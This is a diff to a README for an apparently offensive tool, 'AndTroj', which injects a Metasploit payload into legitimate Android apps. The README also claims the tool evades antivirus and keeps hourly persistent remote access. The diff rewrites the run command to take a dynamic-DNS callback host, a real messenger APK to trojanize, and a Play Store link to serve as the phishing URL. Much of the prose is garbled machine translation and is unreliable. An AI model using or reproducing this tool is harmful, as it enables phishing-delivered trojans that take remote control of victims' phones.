@@ -27,10 +27,10 @@ A tool for integrating the Metasploit payload with Android's healthy programs an
 This tool creates a tune-up of the Metasploit program, unlocks the program and integrates it into the footage. During this operation, the vagaries are mimicking the unpacking Android antivirus and compiling it after the completion of the integration. For the program's service, it's one-on-one and rearwards automatically after getting back access on Android OS Bargas And it runs to allow the service to be activated every hour, all of which is done automatically
 
 
-# How to Run
+# How to Run (Example)
 ```
 # ┌──(unk9vvn㉿avi)-[~]
-# └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $NoIP $Orginal-APK $Phshing-URL
+# └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh example.ddns.net imo-messenger.apk https://play.google.com/store/apps/details?id=com.imo.android.imoim&hl=fa&gl=US
 ```
 Only support the Kali Linux operating system
 
